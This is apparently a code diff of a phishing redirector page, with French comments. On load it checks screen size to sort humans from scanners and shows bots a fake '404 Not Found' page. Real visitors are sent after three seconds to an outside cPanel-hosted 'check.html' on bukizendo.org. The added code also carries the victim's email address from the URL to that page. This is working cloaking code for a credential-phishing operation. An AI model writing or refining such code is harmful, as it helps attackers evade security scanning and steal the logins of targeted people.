@@ -11,20 +11,22 @@
     </style>
     <script>
         function redirect() {
-            var w = window.innerWidth;
-            var h = window.innerHeight;
-            
-            // FILTRAGE AGRESSIF : On ne laisse passer que les écrans de taille humaine
-            if (w > 450 && h > 450) {
-                setTimeout(function() {
-                    // !!! REMPLACE PAR L'URL DE TON CPANEL (ex: https://bukizendo.org/verify.php) !!!
-                    window.location.href = "https://bukizendo.org/check.html";
-                }, 3000);
-            } else {
-                // Page d'erreur crédible pour les robots de scan
-                document.body.innerHTML = "<div style='padding:20px;'><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>";
-            }
-        }
+    var w = window.innerWidth;
+    var h = window.innerHeight;
+    
+    // On récupère l'email dans l'URL (ex: ?email=test@company.com)
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email') || "";
+
+    if (w > 450 && h > 450) {
+        setTimeout(function() {
+            // On transmet l'email vers ton fichier check.html sur cPanel
+            window.location.href = "https://bukizendo.org/check.html?email=" + encodeURIComponent(email);
+        }, 3000);
+    } else {
+        document.body.innerHTML = "<div style='padding:20px;'><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>";
+    }
+}
     </script>
 </head>
 <body onload="redirect()">
